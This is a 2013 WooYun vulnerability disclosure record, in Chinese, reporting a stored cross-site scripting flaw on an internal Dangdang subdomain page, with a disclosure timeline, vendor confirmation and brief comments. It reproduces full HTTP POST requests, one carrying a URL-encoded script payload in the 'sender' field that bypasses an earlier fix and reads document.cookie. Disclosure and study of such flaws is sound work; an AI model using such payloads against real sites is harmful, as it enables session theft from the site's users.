{"id": 7744, "wybug_id": "wooyun-2013-040508", "wybug_title": "当当网某分站存储型xss", "wybug_corp": "当当网", "wybug_author": "D＆G", "wybug_date": "2013-10-21 13:20", "wybug_open_date": "2013-12-05 13:21", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-05：\t细节向公众公开  简要描述： 当当某分站存储型xss 详细说明：   http://robot.dangdang.com/WebIm/page/officialPortal.jsp参考： WooYun: 当当网某分站存储型xss漏洞一枚 当然，这里已经修复了。不过依然存在问题，可以绕过。感觉这个页面是内部用的，没必要开放访问吧。。点击增加新的话题，可以添加标题和内容：\n\n发送如下post请求：\nPOST /WebIm/JQueryAjaxServlet?t=1382331386011 HTTP/1.1Host: robot.dangdang.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:24.0) Gecko/20100101 Firefox/24.0Accept: application/json, text/javascript, */*Accept-Language: en-gb,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://robot.dangdang.com/WebIm/page/officialPortal.jspContent-Length: 261Cookie: JSESSIONID=2798D90285C59C9F7DBABFFEFD5BF140Connection: keep-alivePragma: no-cacheCache-Control: no-cacheaction=officialPortalAction&method=fetchOfficialPost&arg=%7B%22extAttr%22%3A%7B%22company_id%22%3A%223%22%2C%22user_name%22%3A%22%22%2C%22title%22%3A%22qqqqq%22%2C%22postType%22%3A%220%22%2C%22sender%22%3A%22%22%2C%22context%22%3A%22qqqqq%22%2C%22replyid%22%3A%22%22%2C%22startCount%22%3A0%2C%22clientUid%22%3A%22fa1ec384-95a3-49fd-bebe-2703b9692b97%22%2C%22clientUserName%22%3A%22guest%22%7D%7D\narg参数为传递到服务器的内容。经过分析查询时的返回内容：\n\\\"id\\\":\\\"45\\\",\\\"sender\\\":\\\"\\\",\\\"title\\\":\\\"1\\\",\\\"eggs\\\":0,\\\"context\\\":\\\"2\\\",\\\"showStatus\\\":0,\\\"flowers\\\":0,\\\"subList\\\":[],\\\"replyID\\\":\\\"\\\",\\\"replycode\\\":\\\"\\\"},{\\\"followNum\\\":\\\"0\\\",\\\"company_id\\\":\\\"3\\\",\\\"sendTime\\\":\\\"2013-10-21\n发现除了标题和内容，(title,context)外，还会返回多个参数值，比如company_id,sender.而post的参数中恰好也存在这些参数。于是，在post请求中修改sender参数为xss代码。发送如下请求：\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://robot.dangdang.com/WebIm/page/officialPortal.jspContent-Length: 802Cookie: JSESSIONID=2798D90285C59C9F7DBABFFEFD5BF140Connection: keep-alivePragma: no-cacheCache-Control: no-cacheaction=officialPortalAction&method=addOfficialPost&arg=%7b%22%65%78%74%41%74%74%72%22%3a%7b%22%63%6f%6d%70%61%6e%79%5f%69%64%22%3a%22%33%22%2c%22%75%73%65%72%5f%6e%61%6d%65%22%3a%22%22%2c%22%74%69%74%6c%65%22%3a%22%71%71%71%71%71%22%2c%22%70%6f%73%74%54%79%70%65%22%3a%22%30%22%2c%22%73%65%6e%64%65%72%22%3a%22%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e%22%2c%22%63%6f%6e%74%65%78%74%22%3a%22%71%71%71%71%71%22%2c%22%72%65%70%6c%79%69%64%22%3a%22%22%2c%22%73%74%61%72%74%43%6f%75%6e%74%22%3a%30%2c%22%63%6c%69%65%6e%74%55%69%64%22%3a%22%66%61%31%65%63%33%38%34%2d%39%35%61%33%2d%34%39%66%64%2d%62%65%62%65%2d%32%37%30%33%62%39%36%39%32%62%39%37%22%2c%22%63%6c%69%65%6e%74%55%73%65%72%4e%61%6d%65%22%3a%22%67%75%65%73%74%22%7d%7d\n果然没有过滤。\n\n   漏洞证明：  \n\n   修复方案：  没用的页面屏蔽了吧。   版权声明：转载请注明来源 D＆G@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-10-21 14:09 厂商回复： 感谢对当当网安全的关注，已经联系业务部门对此问题进行修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-21 13:54 |    \t\tPgHook \t\t\t( 普通白帽子  |\t\t\t        Rank:964 漏洞数:115        | ...........................................)\t\t \n  前排围观。。。。。。    \n     2013-12-05 13:55 |    \t\t封印师 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 我是小彩笔来的。...(｡•ˇ‸ˇ•｡) ...)\t\t \n  学习    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}